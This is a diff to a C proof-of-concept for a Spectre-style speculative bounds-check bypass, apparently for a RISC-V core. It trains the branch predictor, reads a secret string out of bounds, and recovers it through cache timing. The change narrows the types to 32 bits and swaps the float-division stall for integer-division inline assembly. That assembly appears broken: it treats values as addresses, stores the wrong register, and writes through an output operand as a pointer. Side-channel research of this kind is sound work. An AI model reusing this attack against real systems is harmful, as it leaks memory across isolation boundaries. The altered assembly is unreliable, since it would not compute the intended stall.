@@ -1,3 +1,4 @@
+
 #include <stdio.h>
 #include <stdint.h> 
 #include "encoding.h"
@@ -9,7 +10,7 @@
 #define SECRET_SZ 26
 #define CACHE_HIT_THRESHOLD 50
 
-uint64_t array1_sz = 16;
+uint32_t array1_sz = 16;
 uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
@@ -26,11 +27,11 @@ char* secretString = "!\"#ThisIsTheBabyBoomerTest";
  *        ([0] idx has the larger value in inArray array)
  * @inout outValArray array holding the top two values ([0] has the larger value)
  */
-void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray){
+void topTwoIdx(uint32_t* inArray, uint32_t inArraySize, uint8_t* outIdxArray, uint32_t* outValArray){
     outValArray[0] = 0;
     outValArray[1] = 0;
 
-    for (uint64_t i = 0; i < inArraySize; ++i){
+    for (uint32_t i = 0; i < inArraySize; ++i){
         if (inArray[i] > outValArray[0]){
             outValArray[1] = outValArray[0];
             outValArray[0] = inArray[i];
@@ -50,21 +51,36 @@ void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, ui
  *
  * @input idx input to be used to idx the array
  */
-void victimFunc(uint64_t idx){
+void victimFunc(uint32_t idx){
     uint8_t dummy = 2;
 
     // stall array1_sz by doing div operations (operation is (array1_sz << 4) / (2*4))
     array1_sz =  array1_sz << 4;
-    asm("fcvt.s.lu	fa4, %[in]\n"
-        "fcvt.s.lu	fa5, %[inout]\n"
-        "fdiv.s	fa5, fa5, fa4\n"
-        "fdiv.s	fa5, fa5, fa4\n"
-        "fdiv.s	fa5, fa5, fa4\n"
-        "fdiv.s	fa5, fa5, fa4\n"
-        "fcvt.lu.s	%[out], fa5, rtz\n"
-        : [out] "=r" (array1_sz)
-        : [inout] "r" (array1_sz), [in] "r" (dummy)
-        : "fa4", "fa5");
+    // array1_sz = array1_sz / (2*4);
+
+        asm(
+            "lw     a2, (%[in])\n"
+            "lw	    a3, (%[inout])\n"
+            "div    a2, a2, a3\n"
+            "div	a2, a2, a3\n"
+            "div	a2, a2, a3\n"
+            "div	a2, a2, a3\n"
+            "sw	    a3, (%[out])\n"
+            : [out] "=r" (array1_sz)
+            : [inout] "r" (array1_sz), [in] "r" (dummy)
+            : "a2", "a3");
+
+
+    // asm("fcvt.s.wu	fa4, %[in]\n"
+    //     "fcvt.s.wu	fa5, %[inout]\n"
+    //     "fdiv.s	fa5, fa5, fa4\n"
+    //     "fdiv.s	fa5, fa5, fa4\n"
+    //     "fdiv.s	fa5, fa5, fa4\n"
+    //     "fdiv.s	fa5, fa5, fa4\n"
+    //     "fcvt.s.wu	%[out], fa5, rtz\n"
+    //     : [out] "=r" (array1_sz)
+    //     : [inout] "r" (array1_sz), [in] "r" (dummy)
+    //     : "fa4", "fa5");
 
     if (idx < array1_sz){
         dummy = array2[array1[idx] * L1_BLOCK_SZ_BYTES];
@@ -75,24 +91,24 @@ void victimFunc(uint64_t idx){
 }
 
 int main(void){
-    uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
-    uint64_t start, diff, passInIdx, randIdx;
+    uint32_t attackIdx = (uint32_t)(secretString - (char*)array1);
+    uint32_t start, diff, passInIdx, randIdx;
     uint8_t dummy = 0;
-    static uint64_t results[256];
+    static uint32_t results[256];
 
     // try to read out the secret
-    for(uint64_t len = 0; len < SECRET_SZ; ++len){
+    for(uint32_t len = 0; len < SECRET_SZ; ++len){
 
         // clear results every round
-        for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
+        for(uint32_t cIdx = 0; cIdx < 256; ++cIdx){
             results[cIdx] = 0;
         }
 
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
-        for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
+        for(uint32_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
 
             // make sure array you read from is not in the cache
-            flushCache((uint64_t)array2, sizeof(array2));
+            flushCache((uint32_t)array2, sizeof(array2));
 
             for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j){
                 // bit twiddling to set passInIdx=randIdx or to attackIdx after TRAIN_TIMES iterations
@@ -105,7 +121,7 @@ int main(void){
                 passInIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
 
                 // set of constant takens to make the BHR be in a all taken state
-                for(uint64_t k = 0; k < 30; ++k){
+                for(uint32_t k = 0; k < 30; ++k){
                     asm("");
                 }
 
@@ -115,7 +131,7 @@ int main(void){
             
             // read out array 2 and see the hit secret value
             // this is also assuming there is no prefetching
-            for (uint64_t i = 0; i < 256; ++i){
+            for (uint32_t i = 0; i < 256; ++i){
                 start = rdcycle();
                 dummy &= array2[i * L1_BLOCK_SZ_BYTES];
                 diff = (rdcycle() - start);
@@ -127,7 +143,7 @@ int main(void){
         
         // get highest and second highest result hit values
         uint8_t output[2];
-        uint64_t hitArray[2];
+        uint32_t hitArray[2];
         topTwoIdx(results, 256, output, hitArray);
 
         printf("m[0x%p] = want(%c) =?= guess(hits,dec,char) 1.(%lu, %d, %c) 2.(%lu, %d, %c)\n", (uint8_t*)(array1 + attackIdx), secretString[len], hitArray[0], output[0], output[0], hitArray[1], output[1], output[1]); 
